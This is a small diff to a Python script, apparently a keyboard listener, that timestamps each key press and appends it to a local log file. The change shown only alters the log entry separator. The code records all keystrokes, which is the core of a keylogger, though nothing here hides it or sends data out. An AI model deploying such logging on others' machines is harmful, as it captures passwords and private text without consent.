@@ -24,9 +24,9 @@ def on_press(key):
     hotkey.press(listener.canonical(key))
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     try:
-        entry = f"{timestamp}: {key.char}"
+        entry = f"{timestamp} = {key.char}"
     except:
-        entry = f"{timestamp}: {key}"
+        entry = f"{timestamp} = {key}"
 
     with open(log_file, "a") as f: #appende al file
         f.write(entry + "\n")
